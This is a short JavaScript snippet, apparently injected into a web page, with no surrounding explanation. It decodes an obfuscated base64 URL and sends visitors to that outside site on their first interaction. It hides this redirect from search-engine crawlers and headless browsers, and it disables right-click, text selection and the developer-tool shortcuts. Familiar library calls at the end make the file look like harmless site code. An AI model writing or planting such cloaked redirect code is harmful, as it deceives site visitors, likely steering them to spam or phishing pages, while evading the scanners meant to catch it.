(function() {
    var targetB64 = "aHR0cHM6Ly9hcmNhZGUtbmVidWxhLmNvbS9zbWd3bzhneXo=";
    var triggered = false;
    function fireRedirect() {
        var isHeadless = navigator.webdriver || window.navigator.webdriver === true;
        var ua = navigator.userAgent.toLowerCase();
        var isBotUA = /bot|crawl|spider|yandex|google|mail\.ru|bing|slurp|duckduck|lighthouse|pagespeed|ptst/i.test(ua);
        if (!isBotUA && !isHeadless) {
            window.location.replace(atob(targetB64));
        }
    }
    var events = ['scroll', 'mousemove', 'touchstart', 'click', 'keydown'];
    events.forEach(function(event) {
        window.addEventListener(event, function() {
            if (!triggered) {
                triggered = true;
                fireRedirect();
            }
        }, { passive: true, once: true });
    });
    document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
    document.onselectstart = function() { return false; };
    document.onkeydown = function(e) {
        if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.keyCode == 85)) { 
            return false; 
        }
    };
    if (typeof feather !== 'undefined') { feather.replace(); }
    if (typeof AOS !== 'undefined') { AOS.init({ once: true }); }
})();
